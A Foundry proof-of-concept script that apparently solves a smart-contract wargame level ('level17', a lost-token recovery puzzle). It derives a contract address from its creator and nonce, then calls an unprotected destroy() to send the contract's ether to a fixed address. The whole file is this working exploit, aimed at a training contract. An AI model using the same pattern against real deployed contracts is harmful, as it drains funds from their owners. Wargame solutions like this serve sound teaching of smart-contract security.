// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../instances/Ilevel17.sol";
import "forge-std/Script.sol";

contract POC is Script {
    function run() external {
        vm.startBroadcast();
        address payable lostcontract = payable(
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xd6),
                                bytes1(0x94),
                                address(
                                    0xb7283eC1D158b01C6670315053541fAee9C3aB6a
                                ),
                                bytes1(0x01)
                            )
                        )
                    )
                )
            )
        );

        SimpleToken level17 = SimpleToken(lostcontract);
        level17.destroy(payable((0x52D6eFC2994ebd93c883b5dA1d32a6cae6bE105B)));

        vm.stopBroadcast();
    }
}
